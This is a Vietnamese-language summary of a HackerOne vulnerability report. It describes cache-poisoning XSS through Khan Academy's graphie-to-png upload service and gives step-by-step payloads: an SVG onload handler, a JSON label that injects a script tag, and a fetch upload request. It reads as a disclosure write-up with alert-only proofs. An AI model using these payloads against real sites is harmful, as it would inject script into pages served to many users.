# https://hackerone.com/reports/2846011
---

## 1. Mô tả lỗ hổng

Kẻ tấn công có thể upload các “graphie” độc hại lên dịch vụ chuyển SVG→PNG của KhanSandbox ([http://graphie-to-png.kasandbox.org/](http://graphie-to-png.kasandbox.org/)) và KhanAcademy Systems ([http://graphie-to-png.khanacademy.systems/](http://graphie-to-png.khanacademy.systems/)). Khi CDN của Khan Academy (cdn.kastatic.org hoặc ka-perseus-graphie.s3.amazonaws.com) cache lại graphie có mã độc, bất kỳ trang nào hiển thị graphie này (ví dụ mọi trang trên khanacademy.org) sẽ chịu ảnh hưởng XSS DOM.

---

## 2. Các bước khai thác

1. **Chuẩn bị “original JS”**

   * Lấy file JS gốc kèm hash (ví dụ: `2122427aa8dc4ef2a59058bc1a7a934ba6ca6747.svg`).
   * Hash này được tính trên nội dung JS, không quan tâm đến SVG/JSON bên trong.

2. **Tạo SVG độc hại**

   ```html
   <!-- Chèn onload để thực thi JS khi SVG được render -->
   <svg … onload="alert('SIKN')">…</svg>
   ```

3. **Tạo JSON độc hại**

   * Trong cấu trúc JSON của graphie, đặt một label có `typesetAsMath: false` để graphie renderer chèn trực tiếp nội dung HTML vào DOM:

   ```json
   {
     "labels": [
       {
         "content": "<script>alert('SIKN')</script>",
         "typesetAsMath": false,
         …
       },
       …
     ],
     …
   }
   ```

4. **Gửi request upload**

   * Dùng `FormData` để đóng gói:

     ```js
     var form = new FormData();
     form.append("js", ORIGINAL_JS);
     form.append("svg", XSS_SVG);
     form.append("other_data", JSON.stringify(XSS_JSON));

     await fetch("http://graphie-to-png.kasandbox.org/svg", {
         method: "POST",
         body: form
     }).then(r => r.text());
     ```
   * Kết quả: CDN sẽ lưu lại file SVG + JSON mới, vẫn giữ nguyên hash JS.

5. **Chờ CDN cập nhật cache**

   * Đợi `cdn.kastatic.org` hoặc bucket S3 của Khan Academy pull bản graphie mới không cache.
   * Khi trang khanacademy.org load graphie này, trình renderer sẽ parse JSON, gặp label `typesetAsMath: false` và inject `<script>…</script>`, hoặc SVG onload sẽ chạy.

---

## 3. Proof of Concept

* Đã override thành công graphie tại
  `https://ka-perseus-graphie.s3.amazonaws.com/2122427aa8dc4ef2a59058bc1a7a934ba6ca6747.svg`
* Khi load trang có graphie đó, cửa sổ alert `'SIKN'` hiện lên.
